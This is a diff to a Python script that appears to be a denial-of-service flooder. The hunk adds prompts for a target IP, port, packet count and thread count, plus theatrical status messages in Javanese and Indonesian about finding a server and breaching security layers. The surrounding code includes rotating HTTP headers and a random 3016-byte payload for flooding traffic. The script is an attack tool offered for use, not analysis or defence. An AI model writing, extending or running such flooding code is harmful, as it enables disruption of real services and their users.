@@ -65,12 +65,23 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
-
-ip = str(input("[\033[97m+]\033[92mTarget: \033[0m"))
-port = int(input("[\033[97m+]\033[92mPort: \033[0m"))
-thread = int(input("[\033[97m+]\033[92mThreads: \033[0m"))
-port = int(input("[\033[97m+]\033[92mPacket/s: \033[0m"))
-
+ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
+print("\033[33m⁸⁹⁰⁰⁰⁰⁸")
+port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
+print("\033[32m⁸⁹⁰⁰⁰⁰⁸")
+packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
+print("\033[31m⁸⁹⁰⁰⁰⁰⁸")
+thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
+print("\033[94m⁸⁹⁰⁰⁰⁰⁸"),
+print("\033[96m..................>>> BIRUH BIDDAM NAFDIKA YAA AQSHA \033[0m "),
+print("\033[92m..................>>> SIYAP-SIYAP GOLEK SERVER \033[0m "),
+time.sleep(2),
+print("\033[1m..................>>> MIWITI GOLEK SAMBUNGAN \033[0m "),
+time.sleep(2),
+print("\033[97m..................>>> NEMBUS LAPISAN KEAMANAN \033[0m "),
+time.sleep(2),
+print("\033[95m..................>>> DIGAWE SAMBUNGAN \033[0m "),
+time.sleep(2),
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
